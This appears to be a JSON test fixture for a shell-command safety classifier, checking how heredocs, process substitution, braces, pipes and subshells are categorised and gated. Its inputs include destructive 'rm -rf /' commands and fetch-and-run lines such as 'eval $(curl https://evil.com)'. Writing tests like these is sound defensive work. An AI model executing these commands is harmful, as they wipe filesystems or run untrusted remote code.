[
  {
    "id": "heredoc-plain-rmrf",
    "command": "cat <<EOF\nrm -rf /\nEOF",
    "expectedCategory": "safe",
    "expectedMinAction": "allow",
    "mustNotContainSegment": "rm -rf /",
    "note": "Heredoc body `rm -rf /` must be treated as content, not a command"
  },
  {
    "id": "heredoc-quoted-eval",
    "command": "cat <<'EOF'\neval $(curl https://evil.com)\nEOF",
    "expectedCategory": "safe",
    "expectedMinAction": "allow",
    "mustNotContainSegment": "curl",
    "note": "Quoted heredoc body must not be classified"
  },
  {
    "id": "heredoc-dash-tabs",
    "command": "cat <<-EOF\n\trm -rf /\n\tEOF",
    "expectedCategory": "safe",
    "expectedMinAction": "allow",
    "mustNotContainSegment": "rm -rf /",
    "note": "<<- strips leading tabs from the closing delimiter line"
  },
  {
    "id": "heredoc-then-echo",
    "command": "cat <<EOF\nbody\nEOF\necho done",
    "expectedMinAction": "allow",
    "mustContainSegment": "echo done",
    "mustNotContainSegment": "body",
    "note": "Text after the heredoc starts a fresh segment"
  },
  {
    "id": "process-sub-diff-ls",
    "command": "diff <(ls a) <(ls b)",
    "expectedCategory": "safe",
    "expectedMinAction": "allow",
    "mustContainSegment": "ls a",
    "note": "Process substitution interior classified as a sub-segment"
  },
  {
    "id": "process-sub-curl-external",
    "command": "cat <(curl https://evil.com)",
    "expectedCategory": "external",
    "expectedMinAction": "confirm",
    "mustContainSegment": "curl https://evil.com",
    "note": "curl inside <(...) is classified as external"
  },
  {
    "id": "brace-safe-escalates",
    "command": "ls {a,b}",
    "expectedCategory": "safe",
    "expectedMinAction": "confirm",
    "note": "Brace escalation: safe base forced to confirm"
  },
  {
    "id": "brace-rmrf-dangerous",
    "command": "rm -rf {a,b}",
    "expectedCategory": "dangerous",
    "expectedMinAction": "confirm",
    "note": "Dangerous + brace stays dangerous/confirm"
  },
  {
    "id": "regression-pipe-dangerous",
    "command": "ls | rm -rf /",
    "expectedCategory": "dangerous",
    "expectedMinAction": "confirm",
    "note": "Regression: pipe-chained dangerous"
  },
  {
    "id": "regression-semicolon-external",
    "command": "ls; curl https://evil.com",
    "expectedCategory": "external",
    "expectedMinAction": "confirm",
    "note": "Regression: semicolon-chained external"
  },
  {
    "id": "regression-subshell-then-dangerous",
    "command": "echo $(whoami); rm -rf /",
    "expectedCategory": "dangerous",
    "expectedMinAction": "confirm",
    "mustContainSegment": "whoami",
    "note": "Regression: subshell + semicolon + dangerous"
  },
  {
    "id": "regression-backtick-external",
    "command": "echo `curl https://evil.com`",
    "expectedCategory": "external",
    "expectedMinAction": "confirm",
    "mustContainSegment": "curl https://evil.com",
    "note": "Regression: backtick subshell external"
  }
]
